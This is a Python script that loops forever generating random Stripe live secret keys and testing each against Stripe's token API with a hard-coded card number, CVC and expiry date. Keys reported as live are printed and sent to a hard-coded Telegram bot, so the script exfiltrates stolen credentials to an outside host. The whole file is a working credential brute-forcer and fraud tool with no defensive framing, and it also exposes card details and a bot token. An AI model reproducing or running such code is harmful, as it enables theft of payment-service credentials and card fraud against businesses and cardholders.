import requests, random, string, time, os, colorama

token = ("5119876537:AAHxxVvcYgs8JdIos0AESgcpr1QSv0q5i9Y")
chatid = ("-790208525")

def long_key():
  skkey = random.choice(['sk_live_51H', 'sk_live_51J'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
    print(f"DEAD > {skkey}")
  else:
    from colorama import Back, Fore, Style
    colorama.init(autoreset=True)
    print(Fore.GREEN+f"LIVE > {skkey}")
    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
    
def short_key():
  skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 34))
  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
    print(f"DEAD > {skkey}")
  else:
    from colorama import Back, Fore, Style
    colorama.init(autoreset=True)
    print(Fore.GREEN+f"LIVE > {skkey}")
    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
    
while True:
  long_key()
  
  short_key()
    
